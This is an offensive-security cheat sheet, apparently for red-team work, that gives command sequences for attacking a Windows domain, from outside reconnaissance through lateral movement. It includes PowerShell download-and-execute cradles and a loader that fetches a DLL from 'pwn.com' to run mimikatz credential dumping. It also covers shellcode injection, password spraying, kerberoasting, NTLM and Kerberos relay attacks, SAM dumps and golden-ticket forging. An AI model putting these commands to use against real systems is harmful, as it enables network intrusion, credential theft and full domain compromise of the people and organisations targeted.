
## Cheat sheet using "helpers.sh" and other scripts/snippets:

### A. outside

#### 1. online content
	 harvestData target.com
	 googleSearch target.com "employee data filetype:pdf"
	 cewlHarvestData https://target.com/page.aspx

#### 2. dns enumeration
	 getIPAddress target.com
	 digDump 10.10.10.1
	 whoisARIN 10.10.10.1
	 dnsRecon target.com ns.target.com
	 dnsReconReverseIP target.com ns.target.com 10.10.10.0/24
	 harvestData target.com

#### 3. ping sweep
	 pingSweep 10.10.10.1
	 pingSweeps hosts.txt
	 pingSweepCIDR 10.10.10.0/24

#### 4. port scans
	 serviceScan hosts.txt
	 fullTCPScan 10.10.10.1
	 quickUDPScan 10.10.10.1

#### 5. fingerprinting
	 fingerPrintHTTPHeaders hosts.txt
	 fingerPrintSMBHTTP hosts.txt
	 scanSMBSettings hosts.txt
	 fingerPrintSMBHTTP hosts.txt
	 fingerPrintHTTPHeader target.com

#### 6. check cves
	 searchsploit exploit|grep remote
	 googleSearch github.com "CVE-2020-XXXX"

#### 7. manual enumeration
	 dirb https://target.com/ /seclists/common.txt -X .aspx, .asmx, .svc
	 wfuzz -w wordlist/general/common.txt http://target.com/FUZZ
	 python cve-2020-XXXX_checker.py target.com

#### 8. exploit
	 sprayHTTP target.com target.local usernames.txt Summer2020
	 rulerCheck user.name@target.local	 
	 # start /b powershell.exe -exec bypass -noninteractive -c iex(new-object net.webclient).downloadstring('...')
	 # start /b powershell.exe -exec bypass -noninteractive -c iex(iwr http://'...')
	 # start /b powershell.exe -exec bypass -noninteractive -c iex(gc ....txt|out-string)

### B. inside

#### 1. broadcasts
	 dnsBroadcastDiscovery
	 dhcpBroadcastScan
	 respondRelay
	 tcpdump -lnv -i eth0 icmp

#### 2. dns enumeration
	 getIPAddress target.local dc.target.local
	 digDump dc.target.local
	 dnsRecon target.local dc.target.local
	 dnsReconReverseIP target.local dc.target.local 10.10.10.0/24

#### 3. ping sweep
	 pingSweep 10.10.10.1
	 pingSweeps hosts.txt
	 pingSweepCIDR 10.10.10.0/24

#### 4. port scans
	 serviceScans hosts.txt
	 serviceScan 10.10.10.1
	 fullTCPScan 10.10.10.1
	 quickUDPScan 10.10.10.1

#### 5. fingerprinting
	 serviceFingerprintScan 10.10.10.1
	 fingerPrintHTTPHeaders hosts.txt
	 fingerPrintSMBHTTP hosts.txt
	 scanSMBSettings hosts.txt
	 fingerPrintSMBHTTP hosts.txt
	 fingerPrintHTTPHeader target.com

#### 6. rpc enumeration
	 getRPCUserInfo 10.10.10.1
	 getRPCPWInfo 10.10.10.1
	 checkRPCPrintSpool 10.10.10.1
	 getInterfaces 10.10.10.1

#### 7. dumps
	 dumpRPC 10.10.10.1
	 dumpSAMR 10.10.10.1

#### 6. check cves
	 searchsploit exploit|grep remote
	 googleSearch github.com "CVE-2020-XXXX"

#### 7. manual enumeration
	 dirb https://sp.target.local/ /common.txt -X .aspx, .asmx
	 wfuzz -w wordlist/general/common.txt http://web.target.local/FUZZ
	 python cve-2020-XXXX_checker.py target.local

#### 8. exploit	 
	 spraySMB target.com target.local usernames.txt Summer2020	 
	 implantShellcode
	 # start /b powershell.exe -exec bypass -noninteractive -c iex(new-object net.webclient).downloadstring('...')
	 # iex(new-object net.webclient).downloadstring('...');

### C. local

#### 1. enum
	 # seatbelt -user
	 # invoke-hostenum
	 # invoke-allchecks
	 # invoke-sharefinder
	 # invoke-edrchecker
	 # invoke-bloodhound -domain target.local
	 # $boxes=get-netcomputer -domain target.local -fulldata
	 # gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("configuration/appSettings/add")}
	 # gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/connectionStrings/add")}
	 # gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/system.web/machineKey")}
	 # $boxes|%{$_|add-member -membertype noteproperty -name ipaddress -value (get-ipaddress $_.dnshostname).ipaddress -force};
	 # $boxes|%{$_|add-member -membertype noteproperty -name shares -value (invoke-sharefinder -computername $_.dnshostname -excludestandard -checkshareaccess) -force};
	 # foreach($item in $shares){$share,$desc=$item -split ' ',2;gci -file -filter *.config -path "$share"|%{([xml](gc $_.fullname)).selectnodes("configuration/appSettings/add")|where key -match pass}}

#### 2. privesc
	 # invoke-kerberoast -domain target.local -outputformat hashcat|select hash
	 # invoke-tokenmanipulation -createprocess "cmd.exe" -username "target.local/user.name" processargs "/c whoami"";
	 # invoke-binary rubeus.exe triage
	 # invoke-binary rubeus.exe dump
	 # invoke-binary internalmonologue.exe
	 # sweetpotato.exe -c 4991d34b-xxx-xxx-xxx-xxx -p cmd.exe -a "/c whoami" -l 65535
	 # dll-loader -http -path http://pwn.com/sharpsploit.dll; [sharpsploit.credentials.mimikatz]::logonpasswords();
	 # inject-shellcode -shellcode $buf -parentid 4502 -queueuserapc	 
	 # invoke-inveigh -http n
	 # invoke-inveighrelay -target target.local -command "whoami"
	 # invoke-socksproxy -port 65535
	 # make immutable:
	 # chattr +i /path/to/filename
	 # chattr +i /etc/shadow
	 # lsattr /etc/shadow
	 # remove immutable:
	 # chattr -i /etc/shadow
	 # lsattr /etc/shadow

### D. network 	

#### 1. lateral
     getSPNs target.local
	 crackSPNs spns.txt passwords.txt
	 respondRelay
	 ntlmRelay hosts.txt
	 smbRelay target.local
	 localProxy
	 portForward 65535 127.0.0.1 10.10.10.1 65535
	 socksProxy 127.0.0.1 65535 root 10.10.10.1
	 localHTTPTunnel 127.0.0.1 65535 http://target.com/george.aspx	 
	 pyinstaller.exe -onefile socks.py
	 dropImplant target.local
	 wmiShell target.local
	 winRMShell target.local
	 smbShell target.local
	 getUser admin.user
	 getComputer dc.target.local
	 getUsers target.local
	 getFullComputers target.local
	 getShares target.local
	 mountShare target.local e\$ 
	 find ./ type -f -name "*web*.config"
	 grep -rnw "password" 

#### 2. escalation
	 getLoggedOn target.local
	 getSessions target.local
	 dumpSAM target.local
	 huntUser admin.user
	 getDelegation target.local
	 addSPNDNS host/pwn-target.local dc.target.local
	 addDNS 10.10.10.1 pwn-target.local dc.target.local
	 ntlmRelayDelegate box.local target.local 10.10.10.1
	 krbRelayUser target.local user.name Summer2020
	 krbRelayUser AES256XXXX
	 printerRelay dc.target.local pwn-target.local
	 krbExportTGT dc.target.local_krbtgt.ccache
	 dumpSIDs dc.target.local
	 getGoldTicket AES256XXXX S-1-5-21-XXXX target.local pwn.user
	 dumpDCOnlyTGT dc.target.local
	 searchsploit "privesc"|grep local
	 googleSearch github.com "privesc CVE-2020-XXXX"
